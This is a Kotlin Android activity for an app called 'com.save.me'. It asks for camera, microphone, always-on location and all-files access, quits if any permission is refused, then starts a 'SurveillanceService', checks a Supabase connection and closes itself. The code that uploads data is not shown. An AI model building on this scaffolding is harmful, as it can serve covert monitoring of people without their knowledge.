package com.save.me

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import android.widget.ImageView
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.widget.Toast
import kotlinx.coroutines.*

class MainActivity : AppCompatActivity() {
    private lateinit var statusText: TextView
    private lateinit var statusIcon: ImageView

    // Permissions for all Android versions and features
    private val ALL_PERMISSIONS = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.VIBRATE
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) { // Android 13+
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    private val PERMISSION_REQUEST_CODE = 123
    private val MANAGE_STORAGE_REQUEST_CODE = 124
    private val LOCATION_ALL_TIME_REQUEST_CODE = 125

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        statusText = findViewById(R.id.status_text)
        statusIcon = findViewById(R.id.status_icon)

        checkAndRequestAllPermissions()
    }

    private fun checkAndRequestAllPermissions() {
        // Check which permissions need to be requested via ActivityCompat
        val toRequest = ALL_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        // For Android 11+ check MANAGE_EXTERNAL_STORAGE via Environment
        val needsManageStorage = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
                !Environment.isExternalStorageManager()

        // Background location check (Android 10+)
        val needsBackgroundLocation = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED

        if (toRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest, PERMISSION_REQUEST_CODE)
            return
        }

        if (needsManageStorage) {
            // Open settings page for MANAGE_EXTERNAL_STORAGE
            Toast.makeText(this, "Please enable 'Manage all files access' for full storage access.", Toast.LENGTH_LONG).show()
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE)
            return
        }

        if (needsBackgroundLocation) {
            // Directly open the app's location permission page for "Allow all the time"
            Toast.makeText(this, "Please grant 'Allow all the time' location access.", Toast.LENGTH_LONG).show()
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivityForResult(intent, LOCATION_ALL_TIME_REQUEST_CODE)
            return
        }

        // All permissions granted
        onAllPermissionsGranted()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.isEmpty() || grantResults.any { it != PackageManager.PERMISSION_GRANTED }) {
                Toast.makeText(this, "App needs all permissions to work!", Toast.LENGTH_LONG).show()
                finish()
            } else {
                checkAndRequestAllPermissions()
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        // Always re-check permissions after returning from settings
        if (requestCode == MANAGE_STORAGE_REQUEST_CODE || requestCode == LOCATION_ALL_TIME_REQUEST_CODE) {
            checkAndRequestAllPermissions()
        }
    }

    private fun onAllPermissionsGranted() {
        // Start foreground service
        val intent = Intent(this, SurveillanceService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        // Example: Check Supabase connection
        GlobalScope.launch(Dispatchers.Main) {
            val connected = withContext(Dispatchers.IO) { SupabaseUtils.checkConnection() }
            if (connected) {
                statusText.text = getString(R.string.connected)
                statusText.setTextColor(resources.getColor(R.color.green, null))
                statusIcon.setImageResource(android.R.drawable.presence_online)
            } else {
                statusText.text = getString(R.string.not_connected)
                statusText.setTextColor(resources.getColor(R.color.red, null))
                statusIcon.setImageResource(android.R.drawable.presence_offline)
            }
            delay(2000)
            finish()
        }
    }
}